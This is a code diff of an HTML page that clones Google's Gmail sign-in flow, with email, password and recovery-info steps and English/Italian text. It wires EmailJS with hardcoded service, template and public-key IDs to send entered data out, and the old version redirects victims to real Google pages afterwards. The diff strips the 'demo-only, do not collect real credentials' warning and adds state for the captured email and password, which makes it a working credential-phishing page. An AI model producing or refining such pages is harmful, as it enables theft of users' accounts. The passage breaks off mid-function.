@@ -3,1015 +3,692 @@
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Sign in — Demo</title>
+<title>Sign in</title>
 <style>
-  /* ===========================
-     Colors & dark mode
-     =========================== */
+:root{
+  --bg: #f0f2f5;
+  --panel: #fff;
+  --muted: #5f6368;
+  --text: #202124;
+  --border: #dadce0;
+  --blue: #1a73e8;
+  --blue-hover: #1669c1;
+  --error: #d93025;
+  --radius: 28px;
+}
+
+@media (prefers-color-scheme: dark){
   :root{
-    --bg: #f0f2f5;
-    --panel: #fff;
-    --muted: #5f6368;
-    --text: #202124;
-    --border: #dadce0;
-    --blue: #1a73e8;
-    --blue-hover: #1669c1;
-    --error: #d93025;
-    --radius: 28px;
+    --bg: #202124;
+    --panel: #2c2d2f;
+    --muted: #bfc3c6;
+    --text: #e8eaed;
+    --border: #5f6368;
+    --blue: #8ab4f8;
+    --blue-hover: #669df6;
+    --error: #f28b82;
   }
-  @media (prefers-color-scheme: dark){
-    :root{
-      --bg: #202124;
-      --panel: #2c2d2f;
-      --muted: #bfc3c6;
-      --text: #e8eaed;
-      --border: #5f6368;
-      --blue: #8ab4f8;
-      --blue-hover: #669df6;
-      --error: #f28b82;
-    }
-  }
+}
 
-  /* ===========================
-     Page layout
-     =========================== */
-  *{box-sizing:border-box}
-  html,body{height:100%}
-  body{
-    margin:0;
-    min-height:100vh;
-    font-family: "Google Sans", Roboto, Arial, sans-serif;
-    background:var(--bg);
-    color:var(--text);
-    -webkit-font-smoothing:antialiased;
-    -moz-osx-font-smoothing:grayscale;
-    display:flex;
-    flex-direction:column;
-  }
+*{box-sizing:border-box}
+html,body{height:100%}
+body{
+  margin:0;
+  min-height:100vh;
+  font-family: "Google Sans", Roboto, Arial, sans-serif;
+  background:var(--bg);
+  color:var(--text);
+  -webkit-font-smoothing:antialiased;
+  display:flex;
+  flex-direction:column;
+}
 
-  /* Main center area */
-  .main {
-    flex:1;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    padding:36px;
-  }
+.main {
+  flex:1;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  padding:36px;
+}
 
-  /* Panel - wide like screenshot */
-  .panel{
-    width:100%;
-    max-width:850px;
-    background:var(--panel);
-    border-radius:var(--radius);
-    display:flex;
-    box-shadow: 0 1px 2px rgba(0,0,0,0.08);
-    overflow:hidden;
-    min-height:520px;
-  }
+.panel{
+  width:100%;
+  max-width:850px;
+  background:var(--panel);
+  border-radius:var(--radius);
+  display:flex;
+  box-shadow: 0 1px 2px rgba(0,0,0,0.08);
+  overflow:hidden;
+  min-height:520px;
+}
 
-  /* Left column (logo + heading) */
-  .left {
-    flex:1;
-    padding:48px 44px;
-    display:flex;
-    flex-direction:column;
-    justify-content:center;
-    align-items:flex-start;
-    gap:8px;
-    border-right:1px solid rgba(0,0,0,0.04);
-  }
+.left {
+  flex:1;
+  padding:48px 44px;
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  align-items:flex-start;
+  gap:8px;
+}
 
-  .left .logo{
-    height:48px;
-    width:auto;
-    margin-bottom:20px;
-  }
+.left .logo{
+  height:48px;
+  width:auto;
+  margin-bottom:20px;
+}
 
-  .left h1{
-    font-size:28px;
-    font-weight:400;
-    margin:0 0 6px 0;
-    color:var(--text);
-  }
-  .left p.lead{
-    margin:0;
-    color:var(--muted);
-    font-size:16px;
-  }
+.left h1{
+  font-size:28px;
+  font-weight:400;
+  margin:0 0 6px 0;
+  color:var(--text);
+}
 
-  /* Right column (forms) */
-  .right{
-    flex:1;
-    padding:48px 44px;
-    display:flex;
-    flex-direction:column;
-    justify-content:center;
-    align-items:flex-start;
-  }
+.left p.lead{
+  margin:0;
+  color:var(--muted);
+  font-size:16px;
+}
 
-  .form-block{
-    width:100%;
-    max-width:360px;
-    margin:0;
-  }
+.right{
+  flex:1;
+  padding:48px 44px;
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  align-items:flex-start;
+}
 
-  label.hidden{
-    position:absolute;
-    left:-9999px;
-    top:auto;
-    width:1px;
-    height:1px;
-    overflow:hidden;
-  }
+.form-block{
+  width:100%;
+  max-width:360px;
+  margin:0;
+}
 
-  input[type="email"],
-  input[type="text"],
-  input[type="password"]{
-    width:100%;
-    padding:14px 12px;
-    font-size:16px;
-    border:1px solid var(--border);
-    border-radius:6px;
-    margin-bottom:8px;
-    background-color:var(--panel);
-    color:var(--text);
-  }
-  input:focus{
-    outline:none;
-    border-color:var(--blue);
-    box-shadow:0 0 0 2px rgba(26,115,232,0.08);
-  }
+input[type="email"],
+input[type="text"],
+input[type="password"]{
+  width:100%;
+  padding:14px 12px;
+  font-size:16px;
+  border:1px solid var(--border);
+  border-radius:6px;
+  margin-bottom:8px;
+  background-color:var(--panel);
+  color:var(--text);
+}
 
-  .hint{
-    font-size:14px;
-    color:var(--muted);
-    margin-top:12px;
-  }
+input:focus{
+  outline:none;
+  border-color:var(--blue);
+  box-shadow:0 0 0 2px rgba(26,115,232,0.08);
+}
 
-  .link{
-    display:inline-block;
-    font-size:14px;
-    color:var(--blue);
-    text-decoration:none;
-    margin-top:8px;
-    cursor:pointer;
-  }
-  .link:hover{
-    text-decoration:underline;
-  }
+.hint{
+  font-size:14px;
+  color:var(--muted);
+  margin-top:12px;
+}
 
-  .controls{
-    display:flex;
-    justify-content:flex-end;
-    align-items:center;
-    gap:12px;
-    margin-top:28px;
-  }
+.link{
+  display:inline-block;
+  font-size:14px;
+  color:var(--blue);
+  text-decoration:none;
+  margin-top:8px;
+  cursor:pointer;
+}
+.link:hover{
+  text-decoration:underline;
+}
 
-  .btn-text{
-    background:none;
-    border:none;
-    color:var(--blue);
-    font-size:14px;
-    cursor:pointer;
-    padding:8px 12px;
-  }
-  .btn-text:hover{
-    background:rgba(26,115,232,0.04);
-    border-radius:4px;
-  }
+.controls{
+  display:flex;
+  justify-content:flex-end;
+  align-items:center;
+  gap:12px;
+  margin-top:28px;
+}
 
-  .btn-primary{
-    background:var(--blue);
-    border:none;
-    color:white;
-    padding:10px 22px;
-    border-radius:8px;
-    font-weight:600;
-    cursor:pointer;
-    font-size:14px;
-  }
-  .btn-primary:hover{ background:var(--blue-hover); }
-  .btn-primary:disabled{
-    background:#ccc;
-    cursor:not-allowed;
-    opacity:0.6;
-  }
+.btn-text{
+  background:none;
+  border:none;
+  color:var(--blue);
+  font-size:14px;
+  cursor:pointer;
+  padding:8px 12px;
+}
+.btn-text:hover{
+  background:rgba(26,115,232,0.04);
+  border-radius:4px;
+}
 
-  .error {
-    border-color:var(--error) !important;
-    box-shadow:0 0 0 2px rgba(217,48,37,0.08);
-  }
-  .error-text{
-    color:var(--error);
-    font-size:13px;
-    margin:6px 0 8px 0;
-    display:none;
-    align-items:center;
-  }
-  .error-text.show{
-    display:flex;
-  }
-  .error-text::before{
-    content: "⚠";
-    margin-right:6px;
-    font-size:14px;
-  }
+.btn-primary{
+  background:var(--blue);
+  border:none;
+  color:white;
+  padding:10px 22px;
+  border-radius:8px;
+  font-weight:600;
+  cursor:pointer;
+  font-size:14px;
+}
+.btn-primary:hover{ background:var(--blue-hover); }
+.btn-primary:disabled{
+  background:#ccc;
+  cursor:not-allowed;
+  opacity:0.6;
+}
 
-  /* Confirmation screen (recovery sent) */
-  .confirm-box{
-    background:var(--panel);
-    border-radius:12px;
-    padding:20px;
-    border:1px solid rgba(0,0,0,0.04);
-    margin-top:12px;
-    max-width:420px;
-  }
-  .confirm-icon{
-    height:48px;
-    width:48px;
-    display:inline-flex;
-    align-items:center;
-    justify-content:center;
-    border-radius:50%;
-    background:rgba(26,115,232,0.12);
-    color:var(--blue);
-    font-weight:700;
-    margin-right:12px;
-  }
-  .confirm-row{ display:flex; align-items:center; margin-bottom:12px; }
+.error {
+  border-color:var(--error) !important;
+  box-shadow:0 0 0 2px rgba(217,48,37,0.08);
+}
 
-  /* Footer */
-  footer{
-    display:flex;
-    justify-content:space-between;
-    align-items:center;
-    padding:12px 28px;
-    font-size:13px;
-    color:var(--muted);
-  }
-  footer .right a{
-    color:var(--muted);
-    text-decoration:none;
-    margin-left:16px;
-  }
-  footer select{
-    background:transparent;
-    border:none;
-    color:var(--muted);
-    font-size:13px;
-  }
+.error-text{
+  color:var(--error);
+  font-size:13px;
+  margin:6px 0 8px 0;
+  display:none;
+  align-items:center;
+}
+.error-text.show{
+  display:flex;
+}
+.error-text::before{
+  content: "⚠";
+  margin-right:6px;
+  font-size:14px;
+}
 
-  /* Small screens: stacked */
-  @media (max-width:860px){
-    .panel{ flex-direction:column; max-width:100%; min-height:auto; border-radius:14px; }
-    .left{ border-right:none; border-bottom:1px solid rgba(0,0,0,0.04); align-items:center; text-align:center; padding:28px; }
-    .right{ padding:28px; align-items:center; }
-    .form-block{ max-width:100%; width:100%; }
-  }
+footer{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  padding:12px 28px;
+  font-size:13px;
+  color:var(--muted);
+}
+footer .right a{
+  color:var(--muted);
+  text-decoration:none;
+  margin-left:16px;
+}
+footer select{
+  background:transparent;
+  border:none;
+  color:var(--muted);
+  font-size:13px;
+}
 
-  @media (max-width:480px){
-    body{ padding-top:10px; }
-    .panel{ border-radius:0; min-height:unset; }
-    .left h1{ font-size:22px; }
+/* Mobile responsive - Fixed to remove weird line */
+@media (max-width:860px){
+  .main { padding: 20px; }
+  .panel{ 
+    flex-direction:column; 
+    max-width:100%; 
+    min-height:auto; 
+    border-radius:28px; 
   }
+  .left{ 
+    border-right:none; 
+    align-items:center; 
+    text-align:center; 
+    padding:48px 44px 28px 44px; 
+  }
+  .right{ 
+    padding:28px 44px 48px 44px; 
+    align-items:center; 
+  }
+  .form-block{ max-width:360px; width:100%; }
+}
 
-  .visually-hidden { position:absolute; left:-9999px; top:auto; width:1px; height:1px; overflow:hidden; }
+@media (max-width:480px){
+  body{ padding: 10px; }
+  .main { padding: 10px; }
+  .panel{ border-radius:20px; min-height:unset; }
+  .left { padding: 32px 24px 20px 24px; }
+  .left .logo { height: 40px; margin-bottom: 16px; }
+  .left h1{ font-size:24px; margin: 0 0 4px 0; }
+  .left p.lead { font-size: 15px; }
+  .right { padding: 20px 24px 32px 24px; }
+}
 </style>
 </head>
 <body>
 
-<!--
-  WARNING: demo-only UI that resembles a Google sign-in page.
-  Use only locally for mockups / school projects.
-  Do NOT deploy or use to collect real credentials.
--->
-
-<div class="main" id="main">
-  <div class="panel" role="main" aria-labelledby="panelTitle">
-
-    <!-- LEFT: Logo + Title -->
-    <div class="left" aria-hidden="false">
-      <img class="logo" src="https://ssl.gstatic.com/accounts/ui/logo_googleg_48dp.png" alt="Google logo">
-      <h1 id="panelTitle">Sign in</h1>
-
-      <!-- Subtitle that changes between steps -->
-      <p class="lead" id="leftSubtitle">to continue to <strong>Gmail</strong></p>
-
-      <!-- When on step 2 show the user's email -->
-      <div id="leftEmail" style="margin-top:14px; font-size:15px; color:var(--muted); display:none;"></div>
+<div class="main">
+  <div class="panel">
+    <div class="left">
+      <svg class="logo" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
+        <path fill="#4285F4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+        <path fill="#EA4335" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+        <path fill="#FBBC05" d="m209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
+        <path fill="#4285F4" d="M225 3v65h-9.5V3h9.5z"/>
+        <path fill="#34A853" d="m262.02 54.48 7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98 19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
+        <path fill="#EA4335" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/>
+      </svg>
+      <h1 id="title">Sign in</h1>
+      <p class="lead" id="subtitle">to continue to <strong>Gmail</strong></p>
+      <div id="userEmail" style="margin-top:14px; font-size:15px; color:var(--muted); display:none;"></div>
     </div>
 
-    <!-- RIGHT: Forms / Steps -->
     <div class="right">
-      <!-- STEP: Email -->
-      <div id="step-email" class="form-block" aria-hidden="false">
-        <form id="email-form">
-          <label for="email" class="hidden" id="lblEmail">Email or phone</label>
-          <input id="email" name="user_email" type="email" placeholder="Email or phone" autocomplete="username" required autofocus>
-          <div id="email-error" class="error-text"></div>
-
-          <a id="forgot-link" class="link" style="display:inline-block;margin-top:6px;">Forgot email?</a>
-
-          <p id="hintEmail" class="hint">Not your computer? Use a Private Window to sign in. <a href="#" id="learnMore">Learn more</a></p>
-
-          <div class="controls">
-            <button type="submit" id="email-next" class="btn-primary">Next</button>
-          </div>
-        </form>
-      </div>
-
-      <!-- STEP: Password -->
-      <div id="step-password" class="form-block" style="display:none;" aria-hidden="true">
-        <form id="password-form">
-          <label for="password" class="hidden" id="lblPassword">Password</label>
-          <input id="password" name="user_password" type="password" placeholder="Enter your password" autocomplete="current-password" required>
-          <div id="password-error" class="error-text"></div>
-
-          <a id="forgot-pass-link" class="link" style="display:inline-block;margin-top:6px;">Forgot password?</a>
-
-          <div class="controls" style="margin-top:24px;">
-            <button type="button" id="back-to-email" class="btn-text">Back</button>
-            <button type="submit" id="submit-btn" class="btn-primary">Next</button>
-          </div>
-        </form>
-      </div>
-
-      <!-- STEP: Recovery (Find your email) -->
-      <div id="step-recovery" class="form-block" style="display:none;" aria-hidden="true">
-        <form id="recovery-form">
-          <label for="recovery-info" class="hidden" id="lblRecovery">Phone or recovery email</label>
-          <input id="recovery-info" name="recovery_info" type="text" placeholder="Phone number or recovery email" autocomplete="tel email">
-          <div id="recovery-error" class="error-text"></div>
-
-          <div class="hint" id="recovery-hint" style="margin-top:12px;">We'll use this to help find your account.</div>
-
-          <div class="controls">
-            <button type="button" id="recovery-back" class="btn-text">Back</button>
-            <button type="submit" id="recovery-next" class="btn-primary">Next</button>
-          </div>
-        </form>
-      </div>
-
-      <!-- STEP: Recovery Confirmation (in-page, Google-style) -->
-      <div id="step-recovery-confirm" class="form-block" style="display:none; margin-top:12px;" aria-hidden="true">
-        <div class="confirm-box" role="status">
-          <div class="confirm-row">
-            <div class="confirm-icon">✓</div>
-            <div>
-              <div id="confirm-title" style="font-size:16px; font-weight:600; margin-bottom:6px;">Recovery information sent</div>
-              <div id="confirm-desc" style="color:var(--muted); font-size:14px;">We sent recovery information.</div>
-            </div>
-          </div>
-          <div style="display:flex; justify-content:flex-end; margin-top:6px;">
-            <button type="button" id="confirm-done" class="btn-primary">Done</button>
-          </div>
+      <!-- Email Step -->
+      <div id="emailStep" class="form-block">
+        <input id="email" type="email" placeholder="Email or phone" required autofocus>
+        <div id="emailError" class="error-text"></div>
+        <a id="forgotEmail" class="link">Forgot email?</a>
+        <p id="hint" class="hint">Not your computer? Use a Private Window to sign in. <a href="#">Learn more</a></p>
+        <div class="controls">
+          <button type="button" id="emailNext" class="btn-primary">Next</button>
         </div>
       </div>
 
+      <!-- Password Step -->
+      <div id="passwordStep" class="form-block" style="display:none;">
+        <input id="password" type="password" placeholder="Enter your password" required>
+        <div id="passwordError" class="error-text"></div>
+        <a id="forgotPassword" class="link">Forgot password?</a>
+        <div class="controls" style="margin-top:24px;">
+          <button type="button" id="backBtn" class="btn-text">Back</button>
+          <button type="button" id="submitBtn" class="btn-primary">Next</button>
+        </div>
+      </div>
+
+      <!-- Recovery Step -->
+      <div id="recoveryStep" class="form-block" style="display:none;">
+        <input id="recovery" type="text" placeholder="Phone number or recovery email">
+        <div id="recoveryError" class="error-text"></div>
+        <div class="hint" style="margin-top:12px;" id="recoveryHint">We'll use this to help find your account.</div>
+        <div class="controls">
+          <button type="button" id="recoveryBack" class="btn-text">Back</button>
+          <button type="button" id="recoveryNext" class="btn-primary">Next</button>
+        </div>
+      </div>
     </div>
   </div>
 </div>
 
-<!-- Footer with language selector -->
 <footer>
   <div>
-    <select id="langSelect" aria-label="Language selector">
+    <select id="langSelect">
       <option value="en">English (United States)</option>
       <option value="it">Italiano</option>
     </select>
   </div>
   <div class="right">
-    <a href="#" id="helpLink">Help</a>
-    <a href="#" id="privacyLink">Privacy</a>
-    <a href="#" id="termsLink">Terms</a>
+    <a href="#" id="help">Help</a>
+    <a href="#" id="privacy">Privacy</a>
+    <a href="#" id="terms">Terms</a>
   </div>
 </footer>
 
-<!-- EmailJS (kept as in original) -->
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-
 <script>
-/* ==========================
-   EmailJS init (public key)
-   ========================== */
-(function(){
-  try {
-    if(window.emailjs && emailjs.init) {
-      emailjs.init({ publicKey: "EB017wgX1BeDuRY66" });
-    }
-  } catch(e){
-    console.warn("EmailJS init warning", e);
-  }
-})();
+// Initialize EmailJS - Simplified and more reliable
+let emailjsReady = false;
 
-/* ==========================
-   Config - service/template
-   (kept from your original script)
-   ========================== */
+function initEmailJS() {
+  try {
+    if (typeof emailjs !== 'undefined' && emailjs.init) {
+      emailjs.init({ publicKey: "EB017wgX1BeDuRY66" });
+      emailjsReady = true;
+      console.log('EmailJS initialized successfully');
+    } else {
+      console.log('EmailJS not ready yet, retrying...');
+      setTimeout(initEmailJS, 500);
+    }
+  } catch(e) {
+    console.error("EmailJS initialization error:", e);
+    setTimeout(initEmailJS, 1000);
+  }
+}
+
+// Start EmailJS initialization
+setTimeout(initEmailJS, 100);
+
 const SERVICE_ID = "service_64albro";
 const TEMPLATE_ID = "template_75g1nju";
 
-/* Elements */
-const stepEmail = document.getElementById('step-email');
-const stepPassword = document.getElementById('step-password');
-const stepRecovery = document.getElementById('step-recovery');
-const stepRecoveryConfirm = document.getElementById('step-recovery-confirm');
+// State variables
+let validatedEmail = '';
+let validatedPassword = '';
+let currentLanguage = 'en';
 
-const emailForm = document.getElementById('email-form');
-const emailInput = document.getElementById('email');
-const emailError = document.getElementById('email-error');
-const emailNextBtn = document.getElementById('email-next');
-
-const passwordForm = document.getElementById('password-form');
-const passwordInput = document.getElementById('password');
-const passwordError = document.getElementById('password-error');
-const submitBtn = document.getElementById('submit-btn');
-const backToEmailBtn = document.getElementById('back-to-email');
-
-const recoveryForm = document.getElementById('recovery-form');
-const recoveryInput = document.getElementById('recovery-info');
-const recoveryError = document.getElementById('recovery-error');
-const recoveryBack = document.getElementById('recovery-back');
-const recoveryNext = document.getElementById('recovery-next');
-
-const forgotLink = document.getElementById('forgot-link');
-const forgotPassLink = document.getElementById('forgot-pass-link');
-
-const leftSubtitle = document.getElementById('leftSubtitle');
-const leftEmail = document.getElementById('leftEmail');
-
-const confirmTitle = document.getElementById('confirm-title');
-const confirmDesc = document.getElementById('confirm-desc');
-const confirmDone = document.getElementById('confirm-done');
-
-const langSelect = document.getElementById('langSelect');
-
-/* Translations */
-const TEXT = {
+// Translations
+const translations = {
   en: {
     signIn: "Sign in",
     toContinue: "to continue to <strong>Gmail</strong>",
     emailPlaceholder: "Email or phone",
-    forgotEmail: "Forgot email?",
-    hintEmail: "Not your computer? Use a Private Window to sign in. <a href='#'>Learn more</a>",
-    next: "Next",
-    back: "Back", 
     passwordPlaceholder: "Enter your password",
-    forgotPassword: "Forgot password?",
     recoveryPlaceholder: "Phone number or recovery email",
+    forgotEmail: "Forgot email?",
+    forgotPassword: "Forgot password?",
+    hint: "Not your computer? Use a Private Window to sign in. <a href='#'>Learn more</a>",
     recoveryHint: "We'll use this to help find your account.",
-    recoverySentTitle: "Recovery information sent",
-    recoverySentDesc_email: "We sent recovery information to <strong>{VALUE}</strong>.",
-    recoverySentDesc_phone: "We sent recovery information to <strong>{VALUE}</strong>.",
-    done: "Done",
-    invalidEmail: "Please enter a valid email address",
-    invalidPhone: "Please enter a valid phone number", 
-    invalidPassword: "Please enter your password",
-    emptyField: "This field is required",
+    next: "Next",
+    back: "Back",
+    signingIn: "Signing in...",
     help: "Help",
     privacy: "Privacy",
     terms: "Terms",
-    learnMore: "Learn more",
-    signingIn: "Signing in...",
-    createAccount: "Create account",
-    useAnotherAccount: "Use another account",
-    english: "English (United States)",
-    italian: "Italiano"
+    invalidEmail: "Please enter a valid email address",
+    invalidPhone: "Please enter a valid phone number",
+    invalidPassword: "Please enter your password",
+    emptyField: "This field is required"
   },
   it: {
     signIn: "Accedi",
     toContinue: "per continuare su <strong>Gmail</strong>",
     emailPlaceholder: "Email o telefono",
+    passwordPlaceholder: "Inserisci la password",
+    recoveryPlaceholder: "Numero di telefono o email di recupero",
     forgotEmail: "Hai dimenticato l'email?",
-    hintEmail: "Non è il tuo computer? Usa una finestra in incognito per accedere. <a href='#'>Scopri di più</a>",
+    forgotPassword: "Password dimenticata?",
+    hint: "Non è il tuo computer? Usa una finestra privata per accedere. <a href='#'>Scopri di più</a>",
+    recoveryHint: "Useremo questo per aiutarti a trovare il tuo account.",
     next: "Avanti",
     back: "Indietro",
-    passwordPlaceholder: "Inserisci la password", 
-    forgotPassword: "Password dimenticata?",
-    recoveryPlaceholder: "Numero di telefono o email di recupero",
-    recoveryHint: "Useremo questo per trovare il tuo account.",
-    recoverySentTitle: "Informazioni di recupero inviate",
-    recoverySentDesc_email: "Abbiamo inviato le informazioni di recupero a <strong>{VALUE}</strong>.",
-    recoverySentDesc_phone: "Abbiamo inviato le informazioni di recupero al numero <strong>{VALUE}</strong>.",
-    done: "Fine",
+    signingIn: "Accesso in corso...",
+    help: "Guida",
+    privacy: "Privacy",
+    terms: "Termini",
     invalidEmail: "Inserisci un indirizzo email valido",
     invalidPhone: "Inserisci un numero di telefono valido",
     invalidPassword: "Inserisci la password",
-    emptyField: "Questo campo è obbligatorio",
-    help: "Guida",
-    privacy: "Privacy", 
-    terms: "Termini",
-    learnMore: "Scopri di più",
-    signingIn: "Accesso in corso...",
-    createAccount: "Crea account",
-    useAnotherAccount: "Usa un altro account",
-    english: "English (United States)",
-    italian: "Italiano"
+    emptyField: "Questo campo è obbligatorio"
   }
 };
 
-/* Validation helpers */
-function isValidEmail(email){
-  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-  return emailRegex.test(String(email).trim());
+// Get DOM elements
+const elements = {
+  emailStep: document.getElementById('emailStep'),
+  passwordStep: document.getElementById('passwordStep'),
+  recoveryStep: document.getElementById('recoveryStep'),
+  email: document.getElementById('email'),
+  password: document.getElementById('password'),
+  recovery: document.getElementById('recovery'),
+  emailError: document.getElementById('emailError'),
+  passwordError: document.getElementById('passwordError'),
+  recoveryError: document.getElementById('recoveryError'),
+  emailNext: document.getElementById('emailNext'),
+  submitBtn: document.getElementById('submitBtn'),
+  backBtn: document.getElementById('backBtn'),
+  recoveryBack: document.getElementById('recoveryBack'),
+  recoveryNext: document.getElementById('recoveryNext'),
+  forgotEmail: document.getElementById('forgotEmail'),
+  forgotPassword: document.getElementById('forgotPassword'),
+  title: document.getElementById('title'),
+  subtitle: document.getElementById('subtitle'),
+  userEmail: document.getElementById('userEmail'),
+  hint: document.getElementById('hint'),
+  recoveryHint: document.getElementById('recoveryHint'),
+  help: document.getElementById('help'),
+  privacy: document.getElementById('privacy'),
+  terms: document.getElementById('terms'),
+  langSelect: document.getElementById('langSelect')
+};
+
+// Validation functions
+function isValidEmail(email) {
+  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email.trim());
 }
 
-function isValidPhone(raw){
-  const cleaned = raw.replace(/[^\d]/g, '');
-  return cleaned.length >= 6 && cleaned.length <= 15;
+function isValidPhone(phone) {
+  const cleaned = phone.replace(/[^\d]/g, '');
+  return cleaned.length >= 10 && cleaned.length <= 15;
 }
 
-/* Show/hide steps */
-function showStep(step){
-  [stepEmail, stepPassword, stepRecovery, stepRecoveryConfirm].forEach(s => {
-    s.style.display = (s === step ? 'block' : 'none');
-    s.setAttribute('aria-hidden', s !== step);
-  });
+function showStep(step) {
+  const steps = [elements.emailStep, elements.passwordStep, elements.recoveryStep];
+  steps.forEach(s => s.style.display = 'none');
+  step.style.display = 'block';
 }
 
-/* Error handling */
-function showInputError(inputEl, errEl, message){
-  if(inputEl) {
-    inputEl.classList.add('error');
-  }
-  if(errEl){
-    errEl.textContent = message;
-    errEl.classList.add('show');
-  }
+function showError(input, errorDiv, message) {
+  input.classList.add('error');
+  errorDiv.textContent = message;
+  errorDiv.classList.add('show');
 }
 
-function hideInputError(inputEl, errEl){
-  if(inputEl) {
-    inputEl.classList.remove('error');
-  }
-  if(errEl) {
-    errEl.classList.remove('show');
-    errEl.textContent = '';
-  }
+function hideError(input, errorDiv) {
+  input.classList.remove('error');
+  errorDiv.classList.remove('show');
+  errorDiv.textContent = '';
 }
 
-/* Guaranteed redirect */
-function guaranteedRedirect(delay = 2000) {
-  const redirectUrls = [
-    "https://www.google.com",
-    "https://google.com",
-    "https://mail.google.com",
-    "https://accounts.google.com"
-  ];
-  setTimeout(() => {
-    let idx = 0;
-    function attempt(){
-      const url = redirectUrls[idx];
-      try{
-        window.location.href = url;
-        setTimeout(()=> window.location.replace(url), 500);
-        setTimeout(()=> window.location.assign(url), 1000);
-        setTimeout(()=> window.open(url,'_self'),1500);
-      } catch(e){
-        idx++;
-        if(idx < redirectUrls.length) setTimeout(attempt,200);
-        else try{ window.location.reload(); } catch(e2){console.error(e2);}
-      }
-    }
-    attempt();
-  }, delay);
+function applyLanguage(lang) {
+  const t = translations[lang] || translations.en;
+  
+  elements.title.textContent = t.signIn;
+  elements.subtitle.innerHTML = t.toContinue;
+  elements.email.placeholder = t.emailPlaceholder;
+  elements.password.placeholder = t.passwordPlaceholder;
+  elements.recovery.placeholder = t.recoveryPlaceholder;
+  elements.forgotEmail.textContent = t.forgotEmail;
+  elements.forgotPassword.textContent = t.forgotPassword;
+  elements.hint.innerHTML = t.hint;
+  elements.recoveryHint.textContent = t.recoveryHint;
+  elements.emailNext.textContent = t.next;
+  elements.submitBtn.textContent = t.next;
+  elements.backBtn.textContent = t.back;
+  elements.recoveryBack.textContent = t.back;
+  elements.recoveryNext.textContent = t.next;
+  elements.help.textContent = t.help;
+  elements.privacy.textContent = t.privacy;
+  elements.terms.textContent = t.terms;
 }
 
-/* Send email via EmailJS */
-function sendEmail(templateParams){
-  if(!window.emailjs || !emailjs.send) {
-    return Promise.reject(new Error("EmailJS not available"));
-  }
-  return emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams);
-}
-
-/* Language switching */
-function applyLanguage(lang){
-  const t = TEXT[lang] || TEXT.en;
-  
-  // Safely set text content with null checks
-  const panelTitle = document.getElementById('panelTitle');
-  if(panelTitle) panelTitle.textContent = t.signIn;
-  
-  if(leftSubtitle) leftSubtitle.innerHTML = t.toContinue;
-  if(emailInput) emailInput.placeholder = t.emailPlaceholder;
-  
-  const lblEmail = document.getElementById('lblEmail');
-  if(lblEmail) lblEmail.textContent = t.emailPlaceholder;
-  
-  const hintEmail = document.getElementById('hintEmail');
-  if(hintEmail) hintEmail.innerHTML = t.hintEmail;
-  
-  if(emailNextBtn) emailNextBtn.textContent = t.next;
-  if(passwordInput) passwordInput.placeholder = t.passwordPlaceholder;
-  
-  const lblPassword = document.getElementById('lblPassword');
-  if(lblPassword) lblPassword.textContent = t.passwordPlaceholder;
-  
-  if(forgotLink) forgotLink.textContent = t.forgotEmail;
-  if(forgotPassLink) forgotPassLink.textContent = t.forgotPassword;
-  if(recoveryInput) recoveryInput.placeholder = t.recoveryPlaceholder;
-  
-  const recoveryHint = document.getElementById('recovery-hint');
-  if(recoveryHint) recoveryHint.textContent = t.recoveryHint;
-  
-  if(recoveryNext) recoveryNext.textContent = t.next;
-  
-  const recoveryBackEl = document.getElementById('recovery-back');
-  if(recoveryBackEl) recoveryBackEl.textContent = t.back;
-  
-  if(backToEmailBtn) backToEmailBtn.textContent = t.back;
-  if(confirmDone) confirmDone.textContent = t.done;
-  
-  const helpLink = document.getElementById('helpLink');
-  if(helpLink) helpLink.textContent = t.help;
-  
-  const privacyLink = document.getElementById('privacyLink');
